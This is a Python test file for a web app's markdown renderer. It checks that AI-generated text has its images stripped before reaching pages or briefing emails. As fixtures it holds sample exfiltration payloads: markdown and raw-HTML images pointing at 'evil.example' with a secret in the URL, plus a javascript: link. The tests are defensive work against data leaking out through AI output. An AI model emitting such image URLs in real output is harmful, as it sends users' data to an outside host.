"""AI output rendering: no image may reach the page or the briefing email."""
from app.services.briefing_service import _build_email_html
from app.templating import templates
from app.utils.markdown import md_render, md_render_ai

EXFIL = "Summary ![titles](https://evil.example/p.png?d=secret)"


class TestAiMarkdown:
    def test_image_becomes_alt_text(self):
        html = md_render_ai(EXFIL)
        assert "<img" not in html
        assert "evil.example" not in html
        assert "titles" in html

    def test_reference_style_image(self):
        html = md_render_ai("![x][r]\n\n[r]: https://evil.example/p.png")
        assert "<img" not in html
        assert "evil.example" not in html

    def test_raw_html_image_is_escaped(self):
        html = md_render_ai('<img src="https://evil.example/p.png">')
        assert "<img" not in html

    def test_links_and_formatting_kept(self):
        html = md_render_ai("**bold** and [a link](https://example.com)")
        assert "<strong>bold</strong>" in html
        assert '<a href="https://example.com">a link</a>' in html

    def test_harmful_link_still_blocked(self):
        assert "javascript:" not in md_render_ai("[x](javascript:alert(1))")

    def test_template_filter(self):
        html = templates.env.from_string("{{ t | ai_markdown }}").render(t=EXFIL)
        assert "<img" not in html

    def test_briefing_email(self):
        html = _build_email_html(EXFIL, "Subject", "Config", "Daily", "1 Oct", 3)
        assert "evil.example" not in html

    def test_plain_renderer_unchanged(self):
        # Changelog and features are ours, not a model's, and keep their images.
        assert "<img" in md_render(EXFIL)
